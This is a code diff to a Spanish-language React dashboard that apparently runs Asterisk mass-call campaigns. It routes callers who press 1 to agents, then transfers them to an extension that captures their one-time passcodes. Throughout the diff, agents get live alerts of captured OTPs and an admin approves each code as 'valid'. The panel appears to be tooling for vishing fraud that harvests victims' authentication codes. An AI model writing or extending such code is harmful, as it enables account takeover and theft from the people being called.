@@ -727,7 +727,10 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     startedAt?: number;
     answeredAt?: number;
     agentExten?: string;
+    agent?: string;
   } | null>(null);
+
+  const [isTransferringToOtp, setIsTransferringToOtp] = useState(false);
 
   // Audio tone generator for Press 1 detection chime
   const playPress1Chime = () => {
@@ -889,6 +892,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 return {
                   ...prev,
                   capturedOtp: newest.otp,
+                  agent: newest.agent || prev.agent,
                   status: 'otp_captured',
                   otpStatus: (newest.status as any) || prev.otpStatus || 'pending',
                 };
@@ -915,6 +919,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   ) => {
     const num = targetNum || (activeCall ? activeCall.number : '');
     const otp = targetOtp || (activeCall ? activeCall.capturedOtp : '');
+    const rec = otpRecords.find((r) => (recordId && r.id === recordId) || (num && r.number.includes(num)) || (otp && r.otp === otp));
+    const targetAgent = rec?.agent || activeCall?.agent || (activeCall?.agentExten !== 'ringall' ? activeCall?.agentExten : undefined) || (agentExtension !== 'ringall' ? agentExtension : '1001');
 
     if (status === 'valid') {
       if (recordId) validRecordIdsRef.current.add(recordId);
@@ -934,10 +940,11 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               ? {
                   ...prev,
                   capturedOtp: undefined,
+                  agent: targetAgent,
                   status: prev.status === 'otp_captured' ? 'connected' : prev.status,
                   otpStatus: 'valid',
                   validationNote:
-                    '✓ Token VÁLIDO aprobado. ¡Transfiriendo llamada de vuelta a tu extensión de agente (1001)!',
+                    `✓ Token VÁLIDO aprobado. ¡Transfiriendo llamada de vuelta a la extensión de agente (${targetAgent})!`,
                 }
               : null
           );
@@ -965,7 +972,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     setOtpRecords((prev) =>
       prev.map((r) =>
         (recordId && r.id === recordId) || (num && r.number.includes(num)) || (otp && r.otp === otp)
-          ? { ...r, status }
+          ? { ...r, status, agent: targetAgent || r.agent }
           : r
       )
     );
@@ -974,7 +981,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       await fetch('/api/asterisk/otp/decision', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ id: recordId, number: num, otp, status }),
+        body: JSON.stringify({ id: recordId, number: num, otp, status, agent: targetAgent }),
       });
     } catch (e) {
       console.warn('Error syncing OTP decision:', e);
@@ -996,6 +1003,42 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
           );
         }
       }, 1500);
+    }
+  };
+
+  // Transfer live call to automated OTP capture system (Ext. 3333) with sticky agent tracking
+  const handleTransferToOtpSystem = async () => {
+    if (!activeCall) return;
+    setIsTransferringToOtp(true);
+    try {
+      const assignedAgent = activeCall.agent || (activeCall.agentExten !== 'ringall' ? activeCall.agentExten : undefined) || (agentExtension !== 'ringall' ? agentExtension : '1001');
+      const res = await fetch('/api/asterisk/call/transfer-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          channel: activeCall.channel,
+          number: activeCall.number,
+          exten: '3333',
+          agent: assignedAgent,
+        }),
+      });
+      const data = await res.json();
+      if (data.success) {
+        setActiveCall((prev) =>
+          prev
+            ? {
+                ...prev,
+                status: 'in_ivr',
+                agent: assignedAgent,
+                validationNote: `✓ Cliente transferido al Sistema Automático OTP (Ext. 3333). Al validar el código, la llamada retornará a la Extensión ${assignedAgent}.`,
+              }
+            : null
+        );
+      }
+    } catch (e) {
+      console.error('Error transferring to OTP system:', e);
+    } finally {
+      setIsTransferringToOtp(false);
     }
   };
 
@@ -1814,12 +1857,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               <div className="text-[10px] text-slate-400 uppercase font-mono font-bold flex items-center gap-1">
                 <span>Destino al Presionar 1</span>
               </div>
-              {productionMode === 'mass_campaign' ? (
-                <div className="mt-1 flex items-center gap-1.5 text-xs font-mono font-bold text-purple-300">
-                  <Users className="w-3.5 h-3.5 text-purple-400" />
-                  <span>⚡ TODAS las Extensiones (Ring-All)</span>
-                </div>
-              ) : (!isAdmin && activeUser?.assignedExtensions && activeUser.assignedExtensions.length > 0) ? (
+              {(!isAdmin && activeUser?.assignedExtensions && activeUser.assignedExtensions.length === 1) ? (
                 <div className="mt-1 flex items-center gap-1.5 text-xs font-mono font-bold text-emerald-400">
                   <UserCheck className="w-3.5 h-3.5 text-emerald-400" />
                   <span>Ext. {agentExtension} (Tu Extensión)</span>
@@ -1829,8 +1867,11 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   id="select-banner-agent"
                   value={agentExtension}
                   onChange={(e) => setAgentExtension(e.target.value)}
-                  className="mt-1 bg-slate-900 border border-slate-700 hover:border-sky-500 rounded px-2 py-0.5 text-xs text-sky-400 font-mono font-bold focus:outline-none"
+                  className="mt-1 bg-slate-900 border border-slate-700 hover:border-sky-500 rounded px-2 py-0.5 text-xs text-sky-400 font-mono font-bold focus:outline-none cursor-pointer"
                 >
+                  <option value="ringall" className="text-purple-300 font-bold">
+                    ⚡ Todas las Extensiones (Ring-All)
+                  </option>
                   {extensions.map((ext) => (
                     <option key={ext.id} value={ext.extension}>
                       👤 Ext. {ext.extension} {ext.name ? `(${ext.name})` : ''}
@@ -1879,9 +1920,21 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   <span className="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 font-mono text-[10px] border border-emerald-500/40">
                     {liveCapturedAlert.channel || 'Ext. OTP'}
                   </span>
+                  {liveCapturedAlert.agent && (
+                    <span className="px-2 py-0.5 rounded bg-purple-500/30 text-purple-300 font-mono text-[10px] border border-purple-400/40 font-bold">
+                      👤 Asesor: Ext. {liveCapturedAlert.agent}
+                    </span>
+                  )}
                 </div>
-                <div className="text-slate-300 text-xs mt-0.5">
-                  Número: <strong className="text-white font-mono">{liveCapturedAlert.number}</strong> &bull; Hora: <span className="text-slate-400 font-mono">{liveCapturedAlert.timestamp}</span>
+                <div className="text-slate-300 text-xs mt-0.5 flex flex-wrap items-center gap-2">
+                  <span>Número: <strong className="text-white font-mono">{liveCapturedAlert.number}</strong></span>
+                  <span>&bull;</span>
+                  <span>Hora: <span className="text-slate-400 font-mono">{liveCapturedAlert.timestamp}</span></span>
+                  {liveCapturedAlert.agent && (
+                    <span className="text-emerald-400 font-bold text-[11px] bg-emerald-950/40 px-2 py-0.5 rounded border border-emerald-500/30">
+                      ⚡ Retornará a Ext. {liveCapturedAlert.agent} al aprobar
+                    </span>
+                  )}
                 </div>
               </div>
             </div>
@@ -2145,20 +2198,32 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
             </div>
 
             {/* Actions for Live Call */}
-            <div className="flex items-center gap-2">
+            <div className="flex flex-wrap items-center gap-2">
+              <button
+                id="btn-hud-transfer-otp"
+                type="button"
+                onClick={handleTransferToOtpSystem}
+                disabled={isTransferringToOtp}
+                className="inline-flex items-center gap-1.5 px-3.5 py-2.5 rounded-xl text-xs font-black bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white transition-all shadow-md shadow-purple-600/30 border border-purple-400/40 cursor-pointer disabled:opacity-50"
+                title="Transferir al cliente al sistema interactivo para que digite su código OTP (Ext. 3333). La llamada regresará a esta misma extensión una vez que el código sea validado."
+              >
+                <KeyRound className="w-3.5 h-3.5" />
+                <span>{isTransferringToOtp ? 'Transfiriendo...' : 'Mandar a Sistema OTP (3333)'}</span>
+              </button>
+
               <button
                 id="btn-hud-transfer-agent"
                 onClick={handleTransferToAgent}
                 className="inline-flex items-center gap-1.5 px-3.5 py-2.5 rounded-xl text-xs font-black bg-emerald-500 hover:bg-emerald-400 text-black transition-all shadow-md shadow-emerald-500/20"
               >
                 <PhoneForwarded className="w-3.5 h-3.5" />
-                <span>Pasar a Asesor ({activeCall.agentExten || '1001'})</span>
+                <span>Pasar a Asesor ({activeCall.agent || (activeCall.agentExten !== 'ringall' ? activeCall.agentExten : '1001')})</span>
               </button>
 
               <button
                 id="btn-hud-hangup"
                 onClick={handleHangupActiveCall}
-                className="inline-flex items-center gap-1.5 px-3.5 py-2.5 rounded-xl text-xs font-bold bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 border border-rose-500/40 transition-all"
+                className="inline-flex items-center gap-1.5 px-3.5 py-2.5 rounded-xl text-xs font-bold bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 border border-rose-500/40 transition-all cursor-pointer"
               >
                 <PhoneOff className="w-3.5 h-3.5" />
                 <span>Colgar Llamada</span>
@@ -2167,7 +2232,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               <button
                 id="btn-hud-close-test"
                 onClick={() => setActiveCall(null)}
-                className="inline-flex items-center gap-1.5 px-2.5 py-2.5 rounded-xl text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-all"
+                className="inline-flex items-center gap-1.5 px-2.5 py-2.5 rounded-xl text-xs font-semibold bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-all cursor-pointer"
                 title="Cerrar este panel visual de llamada"
               >
                 <X className="w-3.5 h-3.5" />
@@ -2285,7 +2350,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                       El cliente ha marcado la tecla 1 en su teléfono
                     </h3>
                     <p className="text-xs text-amber-200/90 max-w-xl mt-0.5">
-                      Asterisk detectó la marcación DTMF 1. La llamada se está transfiriendo inmediatamente a tu extensión de Asesor (<strong>Ext. {activeCall.agentExten || '1001'}</strong> / Softphone X-Lite). ¡Listo para conversar con el cliente!
+                      Asterisk detectó la marcación DTMF 1. La llamada se está transfiriendo inmediatamente a tu extensión de Asesor (<strong>{activeCall.agent ? `Ext. ${activeCall.agent}` : activeCall.agentExten === 'ringall' ? 'Todas las Extensiones (Ring-All)' : `Ext. ${activeCall.agentExten || '1001'}`}</strong> / Softphone). ¡Listo para conversar con el cliente!
                     </p>
                   </div>
                 </div>
@@ -2297,7 +2362,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                     className="w-full sm:w-auto inline-flex items-center justify-center gap-2 px-5 py-3 rounded-xl font-black text-xs bg-amber-400 hover:bg-amber-300 text-slate-950 transition-all shadow-lg shadow-amber-400/40 animate-pulse"
                   >
                     <PhoneCall className="w-4 h-4" />
-                    <span>Conectar con Softphone (1001)</span>
+                    <span>Conectar con Softphone ({activeCall.agent || (activeCall.agentExten !== 'ringall' ? activeCall.agentExten : '1001')})</span>
                   </button>
                 </div>
               </div>
@@ -3145,10 +3210,16 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 </div>
 
                 <div className="p-3 rounded-xl bg-slate-900 border border-purple-500/30 bg-purple-950/20">
-                  <div className="text-[10px] text-purple-300 font-mono font-bold">Regla de Distribución de Llamadas</div>
-                  <div className="text-xs font-bold text-white mt-1">Cacería Ring-All a Todas las Extensiones</div>
+                  <div className="text-[10px] text-purple-300 font-mono font-bold">Destino al Presionar 1 (Difusión)</div>
+                  <div className="text-xs font-bold text-white mt-1">
+                    {agentExtension === 'ringall'
+                      ? '⚡ Cacería Ring-All a Todas las Extensiones'
+                      : `👤 Extensión Específica: ${agentExtension}`}
+                  </div>
                   <p className="text-[11px] text-slate-300 mt-1 leading-relaxed">
-                    A diferencia del modo individual (donde la llamada solo va al asesor asignado), en esta campaña masiva suenan al mismo tiempo todas las extensiones ({extensions.map((e) => e.extension).join(', ')}). El primero en contestar toma la llamada.
+                    {agentExtension === 'ringall'
+                      ? `Suenan al mismo tiempo todas las extensiones (${extensions.map((e) => e.extension).join(', ')}). La extensión que conteste la llamada (ej: 1002) queda registrada automáticamente, y al transferir al cliente a la extensión 3333 para ingresar su código, cuando el administrador apruebe el código la llamada regresará de inmediato a esa misma extensión 1002.`
+                      : `La llamada irá directamente a la extensión ${agentExtension}.`}
                   </p>
                 </div>
               </div>
@@ -3904,9 +3975,9 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
               <div className="space-y-3">
                 <div>
                   <label className="block text-xs font-bold text-slate-300 mb-1">
-                    Destino Asignado cuando el Cliente Presione 1 (Llamadas Individuales)
+                    Destino Asignado cuando el Cliente Presione 1 (Llamadas Individuales y Masivas)
                   </label>
-                  {!isAdmin && activeUser?.assignedExtensions && activeUser.assignedExtensions.length > 0 ? (
+                  {!isAdmin && activeUser?.assignedExtensions && activeUser.assignedExtensions.length === 1 ? (
                     <div className="p-3 rounded-xl bg-slate-900 border border-emerald-500/40 text-xs flex items-center justify-between">
                       <div>
                         <div className="font-mono font-bold text-emerald-400">Extensión {agentExtension} (Tu Softphone)</div>
@@ -3919,10 +3990,14 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                   ) : (
                     <>
                       <select
+                        id="select-ivr-action-agent"
                         value={agentExtension}
                         onChange={(e) => setAgentExtension(e.target.value)}
-                        className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:border-emerald-500 focus:outline-none"
+                        className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono focus:border-emerald-500 focus:outline-none cursor-pointer"
                       >
+                        <option value="ringall" className="text-purple-300 font-bold">
+                          ⚡ Todas las Extensiones (Ring-All) - Timbran todas a la vez
+                        </option>
                         {extensions.map((ext) => (
                           <option key={ext.id} value={ext.extension}>
                             👤 Extensión {ext.extension} - {ext.name || `Agente ${ext.extension}`}
@@ -3930,7 +4005,15 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                         ))}
                       </select>
                       <div className="text-[11px] text-slate-400 mt-1">
-                        🎯 Agente Específico: La llamada retornará directamente a la extensión <strong className="text-white font-mono">{agentExtension}</strong>. Para hacer sonar todas las extensiones a la vez (Ring-All), utiliza la pestaña <strong>Centro de Llamadas Masivas</strong>.
+                        {agentExtension === 'ringall' ? (
+                          <span className="text-purple-300">
+                            ⚡ <strong>Ring-All Habilitado:</strong> Cuando el cliente pulse 1, timbrarán a la vez todas las extensiones ({extensions.map((e) => e.extension).join(', ')}). Si la llamada la contesta la extensión <strong>1002</strong> y ésta transfiere al cliente al sistema automático (Ext. 3333) para digitar su código, al validarse como aprobado la llamada <strong>retornará de forma exacta a la misma extensión 1002</strong>.
+                          </span>
+                        ) : (
+                          <span>
+                            🎯 <strong>Agente Específico:</strong> La llamada conectará directamente a la extensión <strong className="text-white font-mono">{agentExtension}</strong>. Si dicha extensión transfiere a la 3333 para OTP, tras la validación retornará a la extensión {agentExtension}.
+                          </span>
+                        )}
                       </div>
                     </>
                   )}
